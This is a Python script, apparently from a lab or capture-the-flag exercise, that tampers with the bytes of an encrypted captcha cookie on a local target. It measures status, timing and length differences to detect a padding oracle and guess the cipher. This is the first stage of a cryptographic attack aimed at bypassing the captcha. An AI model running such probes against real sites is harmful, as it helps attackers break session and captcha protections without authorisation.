import requests
import base64
import time

TARGET_URL = "http://127.0.0.1:32869/"

def test_captcha_manipulation(captcha_value, description):
    """Test a specific captcha cookie manipulation"""
    cookies = {'captcha': captcha_value}
    
    start_time = time.time()
    try:
        response = requests.post(
            TARGET_URL,
            data={'captcha_text': 'WRONG'},
            cookies=cookies,
            timeout=5
        )
        elapsed_time = time.time() - start_time
        
        return {
            'desc': description,
            'status': response.status_code,
            'time': elapsed_time,
            'length': len(response.content),
            'has_error': 'error' in response.text.lower() or 'invalid' in response.text.lower(),
            'snippet': response.text[:150]
        }
    except Exception as e:
        elapsed_time = time.time() - start_time
        return {
            'desc': description,
            'status': 'ERROR',
            'time': elapsed_time,
            'length': 0,
            'has_error': True,
            'snippet': str(e)[:150]
        }

# Get fresh captcha cookie
print("[*] Getting fresh captcha cookie...")
response = requests.get(TARGET_URL)
original_captcha = response.cookies.get('captcha')
print(f"[+] Original captcha: {original_captcha}")

# Decode to manipulate bytes
decoded = base64.b64decode(original_captcha)
print(f"[+] Decoded length: {len(decoded)} bytes")
print(f"[+] Decoded hex: {decoded.hex()}")

# Test cases
results = []

# Test 1: Original cookie with wrong captcha
print("\n[*] Testing original cookie...")
results.append(test_captcha_manipulation(original_captcha, "Original"))

# Test 2: Last byte +1
print("[*] Testing last byte +1...")
modified = bytearray(decoded)
modified[-1] = (modified[-1] + 1) % 256
encoded = base64.b64encode(bytes(modified)).decode()
results.append(test_captcha_manipulation(encoded, "LastByte+1"))

# Test 3: Last byte +2
print("[*] Testing last byte +2...")
modified = bytearray(decoded)
modified[-1] = (modified[-1] + 2) % 256
encoded = base64.b64encode(bytes(modified)).decode()
results.append(test_captcha_manipulation(encoded, "LastByte+2"))

# Test 4: Last byte = 0x00
print("[*] Testing last byte = 0x00...")
modified = bytearray(decoded)
modified[-1] = 0x00
encoded = base64.b64encode(bytes(modified)).decode()
results.append(test_captcha_manipulation(encoded, "LastByte=0x00"))

# Test 5: Last byte = 0xFF
print("[*] Testing last byte = 0xFF...")
modified = bytearray(decoded)
modified[-1] = 0xFF
encoded = base64.b64encode(bytes(modified)).decode()
results.append(test_captcha_manipulation(encoded, "LastByte=0xFF"))

# Test 6: Truncated by 1 byte
print("[*] Testing truncated...")
truncated = decoded[:-1]
encoded = base64.b64encode(truncated).decode()
results.append(test_captcha_manipulation(encoded, "Truncated-1"))

# Test 7: First byte +1
print("[*] Testing first byte +1...")
modified = bytearray(decoded)
modified[0] = (modified[0] + 1) % 256
encoded = base64.b64encode(bytes(modified)).decode()
results.append(test_captcha_manipulation(encoded, "FirstByte+1"))

# Test 8: Middle byte +1
print("[*] Testing middle byte +1...")
modified = bytearray(decoded)
mid_idx = len(modified) // 2
modified[mid_idx] = (modified[mid_idx] + 1) % 256
encoded = base64.b64encode(bytes(modified)).decode()
results.append(test_captcha_manipulation(encoded, "MiddleByte+1"))

# Print results table
print("\n" + "="*100)
print("PADDING ORACLE TEST RESULTS")
print("="*100)
print(f"{'Test':<15} {'Status':<8} {'Time(s)':<10} {'Length':<8} {'Error?':<8} {'TimeDiff':<10}")
print("-"*100)

baseline_time = results[0]['time']
for r in results:
    time_diff = r['time'] - baseline_time
    print(f"{r['desc']:<15} {str(r['status']):<8} {r['time']:<10.4f} {r['length']:<8} {str(r['has_error']):<8} {time_diff:+.4f}s")

print("="*100)

# Analysis
print("\n[*] ANALYSIS:")
statuses = set(r['status'] for r in results)
times = [r['time'] for r in results if isinstance(r['time'], float)]
lengths = set(r['length'] for r in results)

print(f"[+] Unique status codes: {statuses}")
print(f"[+] Time range: {min(times):.4f}s - {max(times):.4f}s (variance: {max(times)-min(times):.4f}s)")
print(f"[+] Unique lengths: {lengths}")

if len(statuses) > 1:
    print("[!] DIFFERENT STATUS CODES - Possible oracle!")
if max(times) - min(times) > 0.05:
    print("[!] TIMING DIFFERENCES >50ms - Possible timing oracle!")
if len(lengths) > 2:
    print("[!] MULTIPLE RESPONSE LENGTHS - Possible oracle!")

print(f"\n[+] Cookie structure: {len(decoded)} bytes")
if len(decoded) % 16 == 0:
    print("[!] Length is multiple of 16 - likely AES-CBC!")
elif len(decoded) % 8 == 0:
    print("[!] Length is multiple of 8 - possibly DES/3DES")

print("\n[*] Sample responses:")
for i, r in enumerate(results[:3]):
    print(f"\n--- {r['desc']} ---")
    print(r['snippet'])

